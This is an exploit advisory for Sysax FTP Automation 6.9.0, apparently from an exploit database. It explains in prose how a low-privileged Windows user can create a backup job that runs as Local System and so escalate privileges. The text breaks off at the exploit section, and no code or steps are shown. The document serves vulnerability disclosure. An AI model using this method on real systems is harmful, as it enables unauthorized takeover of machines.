# Exploit Title: Sysax FTP Automation 6.9.0 - Privilege Escalation
# Date: 03-20-2022
# Vulnerable Software: Sysax FTP Automation 6.9.0
# Vendor Homepage: https://www.sysax.com/
# Version: 6.9.0
# Software Link: https://www.sysax.com/download/sysaxauto_setup.msi
# Tested on: Windows 10 x64

# Details:
Sysax Scheduler Service runs as Local System. By default the application allows for low privilege users to create/run backup jobs other than themselves.  By removing the option to run as current user or another, the task will run as System.  A low privilege user could abuse this and escalate their privileges to local system.

# Prerequisites:
To successfully exploit this vulnerability, an attacker must already have local access to a system running Sysax FTP Automation using a low privileged user account

# Exploit:
Logged in as low privileged account
